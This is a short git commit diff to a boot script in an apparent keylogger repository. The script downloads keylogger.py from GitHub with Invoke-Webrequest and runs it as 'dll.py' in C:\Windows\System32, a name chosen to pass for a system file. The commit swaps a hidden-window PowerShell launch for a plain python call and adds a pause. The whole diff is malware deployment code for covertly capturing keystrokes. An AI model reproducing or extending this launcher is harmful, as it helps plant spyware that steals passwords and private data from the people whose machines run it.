fc2fed8df6450e42d027f9fa804bdac2cb76b47a
ASL-rgb <80420900+ASL-rgb@users.noreply.github.com>
2022-08-21 22:38:12 +0200

    Update bootup.cmd

--- bootup.cmd
+++ bootup.cmd
@@ -7,4 +7,5 @@ if (-Not $bol1){
   Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/keylogger.py" -Outfile $dest
 }
 
-powershell -WindowStyle hidden python C:\Windows\System32\dll.py
+python C:\Windows\System32\dll.py
+sleep 10
